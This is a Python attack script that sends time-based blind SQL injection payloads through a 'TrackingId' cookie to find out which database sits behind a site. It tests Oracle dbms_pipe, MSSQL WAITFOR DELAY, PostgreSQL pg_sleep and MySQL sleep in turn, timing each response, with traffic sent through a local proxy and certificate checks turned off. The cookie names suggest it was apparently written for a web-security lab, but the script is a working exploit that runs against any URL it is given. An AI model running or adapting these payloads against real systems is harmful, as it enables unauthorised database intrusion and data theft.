import requests
import sys
import urllib3
import urllib.parse
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Take in a URL and look for time delay options

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

def oracle_check(url,tracking,sid):
    t_0 = time.time()
    sqli_payload = "'|| (dbms_pipe.receive_message(('a'),10))--"
    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
    print(sqli_payload_encoded)
    cookies = {'TrackingId': tracking+sqli_payload_encoded, 'session': sid}
    print(cookies)
    r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    print(r)
    t_1 = time.time() - t_0
    return t_1

def ms_check(url,tracking,sid):
    t_0 = time.time()
    sqli_payload = "'+ (WAITFOR DELAY '0:0:10')--"
    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
    cookies = {'TrackingId': tracking+sqli_payload_encoded, 'session': sid}
    print(cookies)
    r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    t_1 = time.time() - t_0
    return t_1

def pg_check(url,tracking,sid):
    t_0 = time.time()
    sqli_payload = "'||(SELECT pg_sleep(10))--"
    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
    cookies = {'TrackingId': tracking+sqli_payload_encoded, 'session': sid}
    print(cookies)
    r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    t_1 = time.time() - t_0
    return t_1

def mysql_check(url,tracking,sid):
    t_0 = time.time()
    sqli_payload = "' (SELECT sleep(10))-- "
    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
    cookies = {'TrackingId': tracking+sqli_payload_encoded, 'session': sid}
    print(cookies)
    r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    t_1 = time.time() - t_0
    return t_1

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        tracking = sys.argv[2].strip()
        sid = sys.argv[3].strip()
    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <url>')
        print(f'[-] Example: {sys.argv[0]} www.example.com TrackingId SessionId')
        sys.exit(-1)
    
    print('Check for Oracle time delay')
    oracle_time = oracle_check(url, tracking, sid)
    print(f"Oracle response time: {oracle_time}")
    
    print('Check for MS time delay')
    ms_time = ms_check(url, tracking, sid)
    print(f"MS time: {ms_time}")
    
    print('Check for PostgreSQL time delay')
    pg_time = pg_check(url, tracking, sid)
    print(f'PostgreSQL time: {pg_time}')
    
    print('Check for MySQL time delay')
    mysql_time = mysql_check(url, tracking, sid)
    print(f'MySQL time: {mysql_time}')
    
    
